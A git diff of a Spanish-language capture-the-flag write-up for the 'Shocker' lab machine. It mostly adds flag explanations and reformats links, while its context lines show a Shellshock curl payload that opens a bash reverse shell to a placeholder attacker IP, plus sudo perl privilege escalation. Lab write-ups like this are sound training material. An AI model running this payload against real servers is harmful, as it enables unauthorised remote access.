@@ -14,6 +14,7 @@ categories:
 tags:
   - Linux
   - ShellShock Attack
+  - Fuzzing
   - Remote Code Execution - RCE
   - SUDO Exploitation
   - Remote Command Injection - RCI
@@ -143,11 +144,17 @@ Processed Requests: 220560
 Filtered Requests: 220542
 Requests/sec.: 171.5391
 ```
+* -c: Para que se muestren los resultados con colores.
+* --hc: Para que no muestre el codigo de estado 404, hc = hide code.
+* -t: Para usar una cantidad especifica de hilos.
+* -w: Para usar un diccionario de wordlist.
+* Diccionario que usamos: dirbuster
+
 Mmmm hay algunas que son de interes como la cgi-bin pero por el estado que muestra, no las podremos ver aunque sabemos que si existen. Que podemos hacer ahora?
 
 Pues toca investigar, quiza el **cgi-bin** tenga un exploit, vamos a buscar. Encontre algo gracias a **HackTricks**:
 
-https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
+* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
 
 Aqui se habla sobre el ataque **ShellShock** pero esto que es?
 
@@ -155,7 +162,7 @@ Aqui se habla sobre el ataque **ShellShock** pero esto que es?
 
 Aqui más información importante que nos da **OWASP**:
 
-https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
+* https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
 
 Incluso menciona que existe un script en **nmap** para detectar si una victima, en este caso el servidor web de Apache, es vulnerable al **ataque ShellShock**, para que este funciones debemos averiguar si existe el directorio **cgi-bin** y el archivo **user.sh**, nosotros ya encontramos el **cgi-bin** pero no el **user.sh**, veamos que pasa si lo ponemos junto al **cgi-bin** en el buscado:
 
@@ -201,14 +208,14 @@ Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
 ```
 Aqui la página de nmap de donde saque el script:
 
-https://nmap.org/nsedoc/scripts/http-shellshock.html
+* https://nmap.org/nsedoc/scripts/http-shellshock.html
 
 Y si es vulnerable, vamos a utilizar este ataque para ganar acceso a la máquina.
 
 # Explotación de Vulnerabilidades
 Despues de leer el siguiente articulo:
 
-https://blog.cloudflare.com/inside-shellshock/
+* https://blog.cloudflare.com/inside-shellshock/
 
 Utilizaremos la herramienta **curl** para usar el **ataque ShellShock**, hagamos una prueba:
 ```
@@ -272,7 +279,7 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1" '
 ```
 Aqui nos apoyamos de la siguiente página web que te genera Reverse Shells en casi cualquier lenguaje:
 
-https://www.revshells.com/
+* https://www.revshells.com/
 
 * Activamos el comando y vemos el resultado:
 ```
@@ -321,7 +328,7 @@ User shelly may run the following commands on Shocker:
 ```
 Podemos ejecutar **perl** como root, busquemos en GTObins si hay alguna forma de escalar privilegios.
 
-https://gtfobins.github.io/gtfobins/perl/#sudo
+* https://gtfobins.github.io/gtfobins/perl/#sudo
 
 Si hay una forma, intentemosla:
 ```
@@ -432,4 +439,3 @@ Papers: No Results
 * https://gtfobins.github.io/gtfobins/perl/#sudo
 
 # FIN
-
